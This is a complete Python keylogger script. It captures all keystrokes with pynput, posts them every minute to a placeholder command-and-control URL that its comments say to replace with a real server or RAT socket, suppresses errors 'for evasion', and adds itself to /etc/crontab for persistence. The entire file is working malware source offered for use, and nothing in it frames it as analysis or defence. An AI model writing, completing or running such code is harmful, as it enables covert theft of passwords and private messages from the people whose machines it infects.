import pynput.keyboard as keyboard
import threading
import time
import os
import requests  # For exfil

log = []
exfil_url = "http://your-c2-server/exfil"  # Replace with real, or use RAT socket

def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
        log.append(str(key))

def exfil_thread():
    while True:
        time.sleep(60)  # Exfil every minute
        if log:
            data = ''.join(log)
            try:
                requests.post(exfil_url, data={'keys': data})
            except:
                pass  # Silent fail for evasion
            log.clear()

def persistence():
    # Add to cron for auto-start
    os.system('echo "* * * * * python3 /tmp/advanced_keylogger.py" >> /etc/crontab')

listener = keyboard.Listener(on_press=on_press)
listener.start()

threading.Thread(target=exfil_thread, daemon=True).start()
persistence()

listener.join()
